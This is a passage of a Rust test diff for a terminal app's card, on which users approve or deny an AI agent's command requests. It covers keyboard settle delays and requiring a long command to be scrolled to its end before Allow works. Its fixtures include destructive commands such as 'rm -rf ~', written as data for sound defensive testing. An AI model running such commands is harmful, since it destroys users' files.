@@ -313,11 +313,16 @@ impl Harness {
     fn frame_sized(&mut self, window: Vector2F) -> Rc<Scene> {
         let window_id = self.window_id;
         let presenter = &mut self.presenter;
-        self.app.update(|ctx| {
+        let scene = self.app.update(|ctx| {
             let invalidation = ctx.take_all_invalidations_for_window(window_id);
             presenter.invalidate(invalidation, ctx);
             presenter.build_scene(window, 1., ctx)
-        })
+        });
+        // What the window's delegate does after every frame.
+        let workspace = &self.workspace;
+        self.app
+            .update(|ctx| workspace.update(ctx, |workspace, ctx| workspace.frame_drawn(ctx)));
+        scene
     }
 
     /// Arms the first row's detail card, the way `--hover` does.
@@ -2949,7 +2954,7 @@ fn the_window_taking_the_keyboard_keeps_the_way_to_end_shut_a_moment() {
     harness.dispatch_action(TabAction::Close(tabs[0]));
     harness.settle_the_question();
 
-    harness.workspace_update(|workspace, _| workspace.window_focused());
+    harness.workspace_update(|workspace, ctx| workspace.window_focused(ctx));
     assert!(harness.press_key("tab", Modifiers::default()));
     assert_eq!(
         harness.closing_keyboard_on(),
@@ -2960,7 +2965,7 @@ fn the_window_taking_the_keyboard_keeps_the_way_to_end_shut_a_moment() {
     harness.settle_the_question();
     assert!(harness.press_key("tab", Modifiers::default()));
     assert_eq!(harness.closing_keyboard_on(), Some(EndingButton::End));
-    harness.workspace_update(|workspace, _| workspace.window_focused());
+    harness.workspace_update(|workspace, ctx| workspace.window_focused(ctx));
     assert!(harness.press_key("enter", Modifiers::default()));
     assert_eq!(
         harness.tab_ids(),
@@ -6087,6 +6092,7 @@ fn a_tabs_menu_is_the_entries_its_plugins_put_in_it() {
             "crook/tabs/pin-tab",
             "crook/tabs/mark-waiting",
             "crook/tabs/explain-status",
+            "crook/tabs/answer-waiting",
             "crook/tabs/new-group-with-tab",
             "crook/tabs/copy-pane-title",
             "crook/tabs/copy-working-directory",
@@ -20931,6 +20937,103 @@ mod shells {
     }
 
     #[test]
+    fn the_focused_pane_hears_no_key_not_even_ctrl_c() {
+        // The card an agent's question is answered on is up over the agent
+        // that asks. A reflexive ctrl-c to be rid of it would interrupt that
+        // agent's turn — through the bindings, or straight into the tree.
+        use crate::agent::request::AskRequest;
+        use crate::control::ask::Found;
+        use crate::control::protocol::{AgentAsk, AskingAgent, Verb};
+        use crate::control::watch::Feed;
+
+        let mut harness = Harness::panel(1);
+        let Some(pane) = marked_shell(&mut harness) else {
+            return;
+        };
+        await_prompt(&mut harness, pane);
+        let running = |harness: &Harness| {
+            harness.workspace.read(&harness.app, |workspace, _| {
+                workspace
+                    .tabs()
+                    .pane(pane)
+                    .is_some_and(|pane| pane.session().running_command.is_some())
+            })
+        };
+        harness.type_into(pane, "sleep 600\n");
+        harness.wait_for("the shell never reported the command running", |harness| {
+            running(harness)
+        });
+
+        let asked = AgentAsk {
+            agent: AskingAgent::Claude,
+            session: "s1".to_owned(),
+            cwd: "/home/someone/work/crook".to_owned(),
+            tty: 34819,
+            wait: 300,
+            request: AskRequest::Command {
+                command: "rm -rf build".to_owned(),
+                note: None,
+                timeout_ms: None,
+                background: false,
+                outside_sandbox: false,
+            },
+        };
+        let feed = Arc::new(Feed::for_verb(&Verb::AgentAsk(asked.clone())));
+        let held = feed.clone();
+        harness.workspace_update(move |workspace, _| {
+            workspace
+                .asks_mut()
+                .add(
+                    asked,
+                    Found {
+                        pane,
+                        cannot_answer: None,
+                        tab_title: "crook".to_owned(),
+                    },
+                    held,
+                    std::time::Instant::now(),
+                )
+                .expect("held");
+        });
+        harness.run_command("crook/tabs/answer-waiting");
+        harness.frame();
+        assert!(!harness.pane_takes_keys());
+
+        harness.press("c", ctrl(), "c");
+        // Past the bindings, into the tree, as a key the window had no action
+        // for would go: the pane under the card is given no keys at all.
+        harness.dispatch(Event::KeyDown {
+            keystroke: Keystroke::new("c", ctrl()),
+            chars: "\u{3}".to_owned(),
+            origin: Default::default(),
+        });
+        harness.settle(Duration::from_secs(2));
+        assert!(running(&harness), "ctrl-c reached the agent under the card");
+        assert_eq!(feed.held(), 0, "a key answered");
+
+        // With the card gone the same key reaches it, which is what makes the
+        // wait above a wait for something that would have come — once the
+        // keyboard has been still for the card's second: a key on the heels
+        // of the Escape that closed it is kept from the pane as well.
+        assert!(harness.press_key("escape", Modifiers::default()));
+        harness.frame();
+        assert_eq!(
+            harness.action_for("c", ctrl()),
+            Some(super::super::action::AskAction::TooSoon.into())
+        );
+        harness.press("c", ctrl(), "c");
+        harness.settle(super::super::closing::SETTLE + Duration::from_millis(200));
+        assert!(
+            running(&harness),
+            "ctrl-c reached it on the heels of Escape"
+        );
+        harness.press("c", ctrl(), "c");
+        harness.wait_for("ctrl-c never reached the command", |harness| {
+            !running(harness)
+        });
+    }
+
+    #[test]
     fn the_selection_chord_selects_in_the_field_instead_of_switching_tabs() {
         // Both platforms' most-used selection gesture, and on both of them the
         // tab bindings used to eat it: there was no way to select to the end
@@ -29517,7 +29620,7 @@ mod the_agent {
     /// the way the worktree list is — it is the same box in the same
     /// corner, and the two are never up together. Line by line, joined with
     /// a space, so a sentence wrapped to the panel's width reads whole.
-    fn explanation_text(scene: &Scene) -> Option<String> {
+    pub(super) fn explanation_text(scene: &Scene) -> Option<String> {
         let panel = worktree_menu_box(scene)?;
         let lines: Vec<String> = text_lines(scene, |position| panel.contains_point(position))
             .into_iter()
@@ -42660,5 +42763,1473 @@ mod remote_panes {
             written.working_directory.as_deref(),
             Some(checkout.as_path())
         );
+    }
+}
+
+mod answering_card {
+    //! The card an agent's question is answered on. See `workspace::answering`.
+
+    use super::super::action::{AskAction, AskButton, Pressed};
+    use super::*;
+    use crate::agent::request::AskRequest;
+    use crate::control::ask::{AskId, CannotAnswer, Choice, DENIED, Found, How};
+    use crate::control::protocol::{AgentAsk, AskingAgent, Verb};
+    use crate::control::watch::{Feed, Next};
+    use crate::terminal_model::TerminalUpdate;
+
+    use super::the_agent::explanation_text;
+
+    /// A question the window holds, and the feed its hook waits on.
+    struct Held {
+        id: AskId,
+        digest: [u8; 32],
+        feed: Arc<Feed>,
+    }
+
+    impl Held {
+        /// What the window has sent the hook, taken off its feed.
+        fn sent(&self) -> Option<serde_json::Value> {
+            match self.feed.next(Some(std::time::Instant::now())) {
+                Next::Item(item) => Some(item),
+                _ => None,
+            }
+        }
+
+        /// Whether nothing has been sent it.
+        fn nothing_sent(&self) -> bool {
+            self.feed.held() == 0
+        }
+    }
+
+    /// The request a question about `command` carries.
+    fn command(command: &str, outside_sandbox: bool) -> AskRequest {
+        AskRequest::Command {
+            command: command.to_owned(),
+            note: Some("Clean the build".to_owned()),
+            timeout_ms: Some(120_000),
+            background: false,
+            outside_sandbox,
+        }
+    }
+
+    /// Holds `request` from `session` in `pane`, as an agent's hook has the
+    /// window hold it.
+    fn hold_request(
+        harness: &mut Harness,
+        pane: PaneId,
+        session: &str,
+        request: AskRequest,
+        cannot_answer: Option<CannotAnswer>,
+    ) -> Held {
+        let asked = AgentAsk {
+            agent: AskingAgent::Claude,
+            session: session.to_owned(),
+            cwd: "/home/someone/work/crook".to_owned(),
+            tty: 34819,
+            wait: 300,
+            request,
+        };
+        let digest = asked.digest();
+        let feed = Arc::new(Feed::for_verb(&Verb::AgentAsk(asked.clone())));
+        let held = feed.clone();
+        let mut id = None;
+        harness.workspace_update(|workspace, ctx| {
+            id = Some(
+                workspace
+                    .asks_mut()
+                    .add(
+                        asked,
+                        Found {
+                            pane,
+                            cannot_answer,
+                            tab_title: "crook".to_owned(),
+                        },
+                        held,
+                        std::time::Instant::now(),
+                    )
+                    .expect("held"),
+            );
+            // What the socket does once it has held one.
+            workspace.asks_changed(ctx);
+        });
+        Held {
+            id: id.expect("held"),
+            digest,
+            feed,
+        }
+    }
+
+    /// Holds a question about `text` from session `s1` in `pane`.
+    fn hold(harness: &mut Harness, pane: PaneId, text: &str) -> Held {
+        hold_request(harness, pane, "s1", command(text, false), None)
+    }
+
+    /// Opens the card the way the palette's "Answer waiting agent" does.
+    fn open(harness: &mut Harness) {
+        harness.run_command("crook/tabs/answer-waiting");
+        harness.frame();
+    }
+
+    /// The question the card is up on, if it is up.
+    fn card_on(harness: &Harness) -> Option<AskId> {
+        harness.workspace.read(&harness.app, |workspace, _| {
+            workspace.ask_card().map(|card| card.ask())
+        })
+    }
+
+    /// The button the keyboard is on, while the card is up.
+    fn keyboard_on(harness: &Harness) -> Option<AskButton> {
+        harness.workspace.read(&harness.app, |workspace, _| {
+            workspace.ask_card().map(|card| card.chosen())
+        })
+    }
+
+    /// Whether the card is up and says its question is over.
+    fn withdrawn(harness: &Harness) -> bool {
+        harness.workspace.read(&harness.app, |workspace, _| {
+            workspace.ask_card().is_some_and(|card| {
+                matches!(
+                    card.face(workspace.asks()),
+                    super::super::answering::Face::Withdrawn(_)
+                )
+            })
+        })
+    }
+
+    /// Lets the keyboard and the pointer reach the card's buttons, as a
+    /// second of stillness would, and draws it.
+    fn settle(harness: &mut Harness) {
+        harness.workspace_update(|workspace, ctx| workspace.settle_the_ask_card(ctx));
+        harness.frame();
+    }
+
+    /// Presses the card's button that says `label`, on a fresh frame.
+    fn press(harness: &mut Harness, label: &str) {
+        let scene = harness.frame();
+        let at = word_in(&scene, RectF::new(Vector2F::zero(), WINDOW), label);
+        harness.click(at + vec2f(2., -3.), MouseButton::Left);
+    }
+
+    /// Where the card's button that says `label` is, on a fresh frame.
+    fn button_at(harness: &mut Harness, label: &str) -> Vector2F {
+        let scene = harness.frame();
+        word_in(&scene, RectF::new(Vector2F::zero(), WINDOW), label) + vec2f(2., -3.)
+    }
+
+    /// What the card says, all of it, with its lines run together.
+    fn card_text(harness: &mut Harness) -> String {
+        let scene = harness.frame();
+        let header = ["wants to run a command", "no longer waiting on this"]
+            .into_iter()
+            .find(|header| says(&scene, header))
+            .unwrap_or_else(|| panic!("no card is drawn: {}", frame_text(&scene)));
+        let at = word_in(&scene, RectF::new(Vector2F::zero(), WINDOW), header);
+        let ground = scene
+            .layers()
+            .flat_map(|layer| layer.rects.iter())
+            .filter(|rect| {
+                rect.background == Fill::Solid(theme().surface_raised)
+                    && rect.bounds.contains_point(at)
+            })
+            .map(|rect| rect.bounds)
+            .last()
+            .expect("the card's header is on no card");
+        text_lines_over(&scene, ground)
+            .into_iter()
+            .map(|(_, line)| line)
+            .collect::<Vec<_>>()
+            .join("\n")
+    }
+
+    /// Whether the card says `phrase`, wherever it wrapped.
+    fn card_says(harness: &mut Harness, phrase: &str) -> bool {
+        let bare = |text: &str| text.split_whitespace().collect::<String>();
+        bare(&card_text(harness)).contains(&bare(phrase))
+    }
+
+    fn shift() -> Modifiers {
+        Modifiers {
+            shift: true,
+            ..Modifiers::default()
+        }
+    }
+
+    fn too_soon() -> Option<WorkspaceAction> {
+        Some(AskAction::TooSoon.into())
+    }
+
+    /// How the question held as `id` ended, once it has.
+    fn ended(harness: &Harness, id: AskId) -> Option<How> {
+        harness.workspace.read(&harness.app, |workspace, _| {
+            workspace.asks().outcome(id).map(|outcome| outcome.how)
+        })
+    }
+
+    #[test]
+    fn an_ask_arriving_opens_nothing_and_leaves_the_keyboard_with_the_pane() {
+        let mut harness = Harness::new(2);
+        let pane = harness.focused_pane_id().expect("a pane");
+        assert!(harness.pane_takes_keys());
+
+        let held = hold(&mut harness, pane, "rm -rf build");
+
+        assert_eq!(
+            card_on(&harness),
+            None,
+            "a question put a card up by itself"
+        );
+        assert!(
+            !says(&harness.frame(), "wants to run a command"),
+            "{}",
+            frame_text(&harness.frame())
+        );
+        assert!(harness.pane_takes_keys(), "a question took the keyboard");
+        assert_eq!(harness.focused_pane_id(), Some(pane));
+        // Enter is the pane's, not an answer's.
+        assert!(!matches!(
+            harness.action_for("enter", Modifiers::default()),
+            Some(WorkspaceAction::Asking(_))
+        ));
+        assert!(held.nothing_sent());
+    }
+
+    #[test]
+    fn answer_waiting_agent_opens_the_oldest_and_the_tab_menu_offers_answer_only_where_one_waits() {
+        let mut harness = Harness::new(3);
+        let tabs = harness.tab_ids();
+        let first = harness.panes_of(tabs[0])[0];
+        let second = harness.panes_of(tabs[1])[0];
+        let quiet = harness.panes_of(tabs[2])[0];
+        assert_eq!(harness.focused_pane_id(), Some(quiet));
+        let older = hold(&mut harness, second, "make clean");
+        let newer = hold_request(&mut harness, first, "s2", command("rm -rf ~", false), None);
+
+        // From the palette, over a pane nobody is asking in: the oldest.
+        open(&mut harness);
+        assert_eq!(card_on(&harness), Some(older.id));
+        assert!(card_says(&mut harness, "make clean"));
+        assert!(harness.press_key("escape", Modifiers::default()));
+        assert_eq!(card_on(&harness), None);
+
+        // A row whose agent waits offers it; a row whose agent does not, not.
+        harness.open_tab_menu_on(tabs[2], quiet);
+        assert!(
+            !tab_menu_offers(&harness.frame(), "Answer"),
+            "{}",
+            frame_text(&harness.frame())
+        );
+        harness.open_tab_menu_on(tabs[0], first);
+        assert!(tab_menu_offers(&harness.frame(), "Answer…"));
+        assert!(tab_menu_offers(&harness.frame(), "Why this status"));
+
+        // And it is about that row's question, with the menu gone.
+        harness.run_command("crook/tabs/answer-waiting");
+        assert_eq!(card_on(&harness), Some(newer.id));
+        assert_eq!(
+            harness.tab_menu_row(),
+            None,
+            "the menu stayed up under the card"
+        );
+        assert!(card_says(&mut harness, "rm -rf ~"));
+
+        // With nobody asking, nothing.
+        assert!(harness.press_key("escape", Modifiers::default()));
+        harness.workspace_update(|workspace, _| {
+            workspace
+                .asks_mut()
+                .end(older.id, crate::control::ask::Cause::TurnEnded);
+            workspace
+                .asks_mut()
+                .end(newer.id, crate::control::ask::Cause::TurnEnded);
+        });
+        open(&mut harness);
+        assert_eq!(card_on(&harness), None);
+    }
+
+    #[test]
+    fn enter_space_escape_and_a_press_off_the_card_close_it_without_answering() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, pane, "rm -rf build");
+
+        for key in ["enter", "space", "escape"] {
+            open(&mut harness);
+            assert_eq!(keyboard_on(&harness), Some(AskButton::NotNow));
+            assert!(harness.press_key(key, Modifiers::default()));
+            assert_eq!(card_on(&harness), None, "{key} left the card up");
+        }
+        // Settled, Enter is still Not now until the keyboard is moved.
+        open(&mut harness);
+        settle(&mut harness);
+        assert!(harness.press_key("enter", Modifiers::default()));
+        assert_eq!(card_on(&harness), None);
+
+        open(&mut harness);
+        press(&mut harness, "Not now");
+        assert_eq!(card_on(&harness), None, "Not now left the card up");
+
+        open(&mut harness);
+        harness.click(vec2f(4., WINDOW.y() - 4.), MouseButton::Left);
+        assert_eq!(card_on(&harness), None, "a press off the card left it up");
+
+        assert!(held.nothing_sent(), "closing the card answered");
+        assert_eq!(ended(&harness, held.id), None, "the question ended");
+        assert!(
+            harness.pane_takes_keys(),
+            "the pane never got the keyboard back"
+        );
+    }
+
+    #[test]
+    fn a_key_held_across_the_card_closing_never_reaches_the_pane_under_it() {
+        // The pane under the card is the agent's, with its own dialog up and
+        // Yes as its default. Whatever closed the card, held until it
+        // repeats, is kept from it until the keyboard has been still.
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, pane, "rm -rf build");
+        for key in ["enter", "space", "escape"] {
+            open(&mut harness);
+            // Escape closes at once, and so do Enter and Space on Not now.
+            assert!(harness.press_key(key, Modifiers::default()));
+            assert_eq!(card_on(&harness), None, "{key} left the card up");
+            for _ in 0..3 {
+                assert_eq!(
+                    harness.action_for(key, Modifiers::default()),
+                    too_soon(),
+                    "a repeat of {key} reached the pane"
+                );
+            }
+            assert_eq!(harness.action_for("y", Modifiers::default()), too_soon());
+        }
+        // Settled, an answer sent closes it the same way.
+        open(&mut harness);
+        settle(&mut harness);
+        assert!(harness.press_key("left", Modifiers::default()));
+        assert!(harness.press_key("left", Modifiers::default()));
+        assert_eq!(keyboard_on(&harness), Some(AskButton::Deny));
+        harness.workspace_update(|workspace, ctx| workspace.settle_the_ask_card(ctx));
+        assert!(harness.press_key("enter", Modifiers::default()));
+        assert_eq!(card_on(&harness), None);
+        assert_eq!(held.sent().expect("a deny")["answer"]["decision"], "deny");
+        assert_eq!(
+            harness.action_for("enter", Modifiers::default()),
+            too_soon()
+        );
+        assert_eq!(harness.field_text(pane), "", "the pane was typed into");
+    }
+
+    #[test]
+    fn tab_never_goes_round_from_not_now_to_allow_and_a_move_waits_before_a_press() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, pane, "rm -rf build");
+        open(&mut harness);
+        settle(&mut harness);
+
+        // Tab from the default stays on it: Not now is the last button.
+        assert!(harness.press_key("tab", Modifiers::default()));
+        assert_eq!(keyboard_on(&harness), Some(AskButton::NotNow));
+        settle(&mut harness);
+        assert!(harness.press_key("enter", Modifiers::default()));
+        assert_eq!(card_on(&harness), None, "Tab, Enter was not Not now");
+        assert!(held.nothing_sent(), "Tab, Enter answered");
+
+        // Moved onto Allow, Enter at once is too soon, and starts it again.
+        open(&mut harness);
+        settle(&mut harness);
+        for _ in 0..3 {
+            assert!(harness.press_key("tab", shift()));
+            settle(&mut harness);
+        }
+        assert_eq!(keyboard_on(&harness), Some(AskButton::Allow));
+        assert!(harness.press_key("tab", shift()), "Shift-Tab went round");
+        assert_eq!(keyboard_on(&harness), Some(AskButton::Allow));
+        assert_eq!(
+            harness.action_for("enter", Modifiers::default()),
+            too_soon()
+        );
+        assert!(
+            held.nothing_sent(),
+            "a move and a press in one breath allowed"
+        );
+        settle(&mut harness);
+        assert!(harness.press_key("enter", Modifiers::default()));
+        assert_eq!(
+            held.sent().expect("an allow")["answer"]["decision"],
+            "allow"
+        );
+    }
+
+    #[test]
+    fn turning_answering_off_passes_every_question_held_and_answers_none() {
+        let mut harness = Harness::new(2);
+        let tabs = harness.tab_ids();
+        let away = harness.panes_of(tabs[0])[0];
+        let here = harness.focused_pane_id().expect("a pane");
+        let shown = hold(&mut harness, here, "rm -rf build");
+        let other = hold_request(&mut harness, away, "s2", command("make", false), None);
+        open(&mut harness);
+        settle(&mut harness);
+        assert_eq!(card_on(&harness), Some(shown.id));
+
+        harness.dispatch_workspace_action(SettingsAction::ToggleAgentsAsk.into());
+
+        for held in [&shown, &other] {
+            assert_eq!(
+                held.sent(),
+                Some(serde_json::json!({"answer": {"decision": "pass", "why": "answering-off"}}))
+            );
+            assert_eq!(
+                ended(&harness, held.id),
+                Some(How::Ended(crate::control::ask::Cause::AnsweringOff))
+            );
+        }
+        assert_eq!(card_on(&harness), Some(shown.id));
+        assert!(card_says(
+            &mut harness,
+            "Letting agents ask in Crook was turned off."
+        ));
+        assert!(!card_says(&mut harness, "Allow once"));
+    }
+
+    #[test]
+    fn a_press_is_refused_while_answering_is_off() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, pane, "rm -rf build");
+        open(&mut harness);
+        settle(&mut harness);
+        harness.workspace_update(|workspace, _| {
+            workspace.turn_answering_off_and_keep_the_questions();
+        });
+        harness.dispatch_workspace_action(
+            AskAction::Answer {
+                ask: held.id,
+                digest: held.digest,
+                decision: Choice::Deny,
+                by: Pressed::Pointer,
+            }
+            .into(),
+        );
+        assert!(held.nothing_sent(), "a press answered with answering off");
+        assert!(card_says(&mut harness, "This request changed or ended"));
+    }
+
+    #[test]
+    fn keys_typed_before_the_card_settles_reach_neither_allow_nor_the_pane() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, pane, "rm -rf build");
+        open(&mut harness);
+
+        // Hands still typing after the gesture: completion, a space, an Enter.
+        for (key, modifiers) in [
+            ("l", Modifiers::default()),
+            ("tab", Modifiers::default()),
+            ("tab", shift()),
+            ("left", Modifiers::default()),
+            ("right", Modifiers::default()),
+            ("space", Modifiers::default()),
+            ("c", ctrl_only()),
+        ] {
+            let action = harness.action_for(key, modifiers);
+            assert!(
+                action == too_soon() || action == Some(AskAction::NotNow.into()),
+                "{key} meant {action:?}"
+            );
+            if action == too_soon() {
+                harness.press(key, modifiers, key);
+            }
+        }
+        assert_eq!(keyboard_on(&harness), Some(AskButton::NotNow));
+        assert!(held.nothing_sent());
+        assert_eq!(harness.field_text(pane), "", "the pane was typed into");
+        assert!(!harness.pane_takes_keys());
+    }
+
+    fn ctrl_only() -> Modifiers {
+        Modifiers {
+            ctrl: true,
+            ..Modifiers::default()
+        }
+    }
+
+    #[test]
+    fn any_other_key_restarts_the_wait() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, pane, "rm -rf build");
+        open(&mut harness);
+
+        settle(&mut harness);
+        assert_eq!(harness.action_for("x", Modifiers::default()), too_soon());
+        assert_eq!(
+            harness.action_for("tab", Modifiers::default()),
+            too_soon(),
+            "a stray key left the way to Allow open"
+        );
+
+        // A modifier on its own is not typing: it is how Shift-Tab is reached.
+        settle(&mut harness);
+        assert_eq!(harness.action_for("shift", shift()), None);
+        assert_eq!(
+            harness.action_for("tab", shift()),
+            Some(AskAction::Choose(AskButton::GoTo).into())
+        );
+
+        // The scroll keys are somebody reading, and restart it too.
+        settle(&mut harness);
+        assert_eq!(
+            harness.action_for("down", Modifiers::default()),
+            Some(AskAction::Scrolled.into())
+        );
+        assert_eq!(harness.action_for("tab", Modifiers::default()), too_soon());
+        assert!(held.nothing_sent());
+    }
+
+    #[test]
+    fn the_window_taking_the_keyboard_restarts_it() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, pane, "rm -rf build");
+        open(&mut harness);
+        settle(&mut harness);
+        let deny = button_at(&mut harness, "Deny");
+
+        harness.workspace_update(|workspace, ctx| workspace.window_focused(ctx));
+        harness.frame();
+
+        assert_eq!(harness.action_for("tab", Modifiers::default()), too_soon());
+        harness.click(deny, MouseButton::Left);
+        assert!(held.nothing_sent(), "the pointer reached Deny");
+        assert_eq!(card_on(&harness), Some(held.id));
+        assert!(!withdrawn(&harness));
+    }
+
+    #[test]
+    fn go_to_and_deny_wait_too() {
+        let mut harness = Harness::new(2);
+        let tabs = harness.tab_ids();
+        let away = harness.panes_of(tabs[0])[0];
+        let here = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, away, "rm -rf build");
+        open(&mut harness);
+
+        // The arrows move through Allow, Deny, Go to and Not now — but not yet.
+        assert_eq!(harness.action_for("left", Modifiers::default()), too_soon());
+        // Pressed before the second is up, by keys or by the pointer, they
+        // do nothing at all.
+        for by in [Pressed::Keys, Pressed::Pointer] {
+            harness.dispatch_workspace_action(
+                AskAction::GoTo {
+                    ask: held.id,
+                    digest: held.digest,
+                    by,
+                }
+                .into(),
+            );
+            assert_eq!(harness.focused_pane_id(), Some(here), "Go to went too soon");
+        }
+        harness.dispatch_workspace_action(
+            AskAction::Answer {
+                ask: held.id,
+                digest: held.digest,
+                decision: Choice::Deny,
+                by: Pressed::Keys,
+            }
+            .into(),
+        );
+        assert!(held.nothing_sent(), "Deny went too soon");
+
+        // Once settled, the keyboard can go to the tab.
+        let mut harness = Harness::new(2);
+        let tabs = harness.tab_ids();
+        let away = harness.panes_of(tabs[0])[0];
+        hold(&mut harness, away, "rm -rf build");
+        open(&mut harness);
+        settle(&mut harness);
+        assert!(harness.press_key("left", Modifiers::default()));
+        assert_eq!(keyboard_on(&harness), Some(AskButton::GoTo));
+        settle(&mut harness);
+        assert!(harness.press_key("enter", Modifiers::default()));
+        assert_eq!(card_on(&harness), None);
+        assert_eq!(harness.focused_pane_id(), Some(away));
+        // The Enter that pressed it, held until it repeats, and a digit typed
+        // on, never reach the agent's own dialog, whose default is Yes.
+        for key in ["enter", "enter", "1"] {
+            assert_eq!(harness.action_for(key, Modifiers::default()), too_soon());
+        }
+        assert_eq!(harness.field_text(away), "");
+    }
+
+    #[test]
+    fn allow_deny_and_go_to_have_no_handler_until_the_card_has_been_up_a_second() {
+        let mut harness = Harness::new(2);
+        let tabs = harness.tab_ids();
+        let away = harness.panes_of(tabs[0])[0];
+        let here = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, away, "rm -rf build");
+        open(&mut harness);
+
+        for label in ["Allow once", "Deny", "Go to tab"] {
+            press(&mut harness, label);
+            assert_eq!(card_on(&harness), Some(held.id), "{label} did something");
+            // Not a handler that was refused: no handler at all.
+            assert!(!withdrawn(&harness), "{label} had a handler");
+        }
+        assert!(held.nothing_sent());
+        assert_eq!(harness.focused_pane_id(), Some(here));
+
+        // The one wait the card starts comes home, by itself, and draws them
+        // live.
+        let opened = std::time::Instant::now();
+        harness.settle_for(std::time::Duration::from_secs(5), |harness| {
+            harness.workspace.read(&harness.app, |workspace, _| {
+                workspace
+                    .ask_card()
+                    .is_some_and(|card| card.pointer_is_live(std::time::Instant::now()))
+            })
+        });
+        assert!(
+            opened.elapsed() >= std::time::Duration::from_millis(900),
+            "live after {:?}",
+            opened.elapsed()
+        );
+        press(&mut harness, "Deny");
+        assert_eq!(card_on(&harness), None);
+        let sent = held.sent().expect("a deny");
+        assert_eq!(sent["answer"]["decision"], "deny", "{sent}");
+    }
+
+    #[test]
+    fn a_press_begun_while_allow_was_inert_does_nothing() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let held = hold(&mut harness, pane, "rm -rf build");
+        open(&mut harness);
+        let allow = button_at(&mut harness, "Allow once");
+
+        harness.hold(allow, 1);
+        settle(&mut harness);
+        harness.let_go(allow);
+        assert!(
+            held.nothing_sent(),
+            "a press begun on an inert Allow allowed"
+        );
+        assert_eq!(card_on(&harness), Some(held.id));
+
+        // A press begun on the live one is a press.
+        press(&mut harness, "Allow once");
+        let sent = held.sent().expect("an allow");
+        assert_eq!(sent["answer"]["decision"], "allow", "{sent}");
+    }
+
+    #[test]
+    fn allow_needs_an_overflowing_command_read_to_its_end() {
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let long: String = (1..=40)
+            .map(|line| format!("echo line {line}"))
+            .collect::<Vec<_>>()
+            .join("\n");
+        let long = format!("{long}\nrm -rf ~");
+        let held = hold(&mut harness, pane, &long);
+        open(&mut harness);
+        settle(&mut harness);
+
+        assert!(card_says(&mut harness, "echo line 1"));
+        assert!(
+            !card_says(&mut harness, "rm -rf ~"),
+            "the box showed it all"
+        );
+        assert!(card_says(
+            &mut harness,
+            "Lines 1–12 of 41 · scroll to the end to allow it"
+        ));
+        press(&mut harness, "Allow once");
+        assert!(held.nothing_sent(), "Allow before the end was read");
+        // Nor does the keyboard ever stand on it.
+        for _ in 0..4 {
+            assert!(harness.press_key("tab", Modifiers::default()));
+            assert_ne!(keyboard_on(&harness), Some(AskButton::Allow));
+        }
+
+        // Read to its end, and back up: it has been seen.
+        assert!(harness.press_key("end", Modifiers::default()));
+        assert!(card_says(&mut harness, "rm -rf ~"));
+        assert!(harness.press_key("home", Modifiers::default()));
+        settle(&mut harness);
+        assert!(!card_says(&mut harness, "rm -rf ~"));
+        press(&mut harness, "Allow once");
+        let sent = held.sent().expect("an allow");
+        assert_eq!(sent["answer"]["decision"], "allow", "{sent}");
+
+        // A press about Allow that never saw the end is refused at the press.
+        let held = hold_request(&mut harness, pane, "s2", command(&long, false), None);
+        open(&mut harness);
+        settle(&mut harness);
+        harness.dispatch_workspace_action(
+            AskAction::Answer {
+                ask: held.id,
+                digest: held.digest,
+                decision: Choice::Allow,
+                by: Pressed::Pointer,
+            }
+            .into(),
+        );
+        assert!(held.nothing_sent());
+        assert!(card_says(&mut harness, "This request changed or ended"));
+    }
+
+    #[test]
+    fn in_a_short_window_allow_waits_for_the_end_to_be_on_screen() {
+        // Ten lines fit the box in an ordinary window. In one 270 px tall the
+        // card is shortened to it, the box shows what room is left, and the
+        // end has to be scrolled to — and drawn inside the window — before
+        // Allow is anything.
+        let short = vec2f(WINDOW.x(), 270.);
+        let mut harness = Harness::new(1);
+        let pane = harness.focused_pane_id().expect("a pane");
+        let ten: String = (1..=9)
+            .map(|line| format!("echo line {line}"))
+            .chain(["rm -rf ~".to_owned()])
+            .collect::<Vec<_>>()
+            .join("\n");
+        let held = hold(&mut harness, pane, &ten);
+        harness.run_command("crook/tabs/answer-waiting");
+        harness.workspace_update(|workspace, ctx| workspace.settle_the_ask_card(ctx));
+        let window = RectF::new(Vector2F::zero(), short);
+        // The first frame measures the box, and the second says so.
+        harness.frame_sized(short);
+        let scene = harness.frame_sized(short);
+
+        // The whole card is in the window, its buttons with it.
+        word_in(&scene, window, "Not now");
+        assert!(
+            frame_text(&scene).contains("scroll to the end to allow it"),
+            "{}",
+            frame_text(&scene)
+        );
+        let allow_reached = |harness: &mut Harness| {
+            for _ in 0..3 {
+                harness.press_key("left", Modifiers::default());
+            }
+            keyboard_on(harness) == Some(AskButton::Allow)
+        };
+        assert!(!allow_reached(&mut harness), "the keyboard reached Allow");
+        harness.dispatch_workspace_action(
+            AskAction::Answer {
+                ask: held.id,
+                digest: held.digest,
+                decision: Choice::Allow,
+                by: Pressed::Keys,
+            }
+            .into(),
+        );
+        assert!(held.nothing_sent(), "Allow before the end was on screen");
+
+        // Scrolled to the end and drawn there, it is read.
+        let held = hold_request(&mut harness, pane, "s2", command(&ten, false), None);
+        harness.run_command("crook/tabs/answer-waiting");
+        harness.workspace_update(|workspace, ctx| workspace.settle_the_ask_card(ctx));
+        harness.frame_sized(short);
+        assert!(harness.press_key("end", Modifiers::default()));
+        let scene = harness.frame_sized(short);
+        word_in(&scene, window, "rm -rf ~");
+        harness.frame_sized(short);
+        harness.workspace_update(|workspace, ctx| workspace.settle_the_ask_card(ctx));
+        assert!(allow_reached(&mut harness));
+        harness.workspace_update(|workspace, ctx| workspace.settle_the_ask_card(ctx));
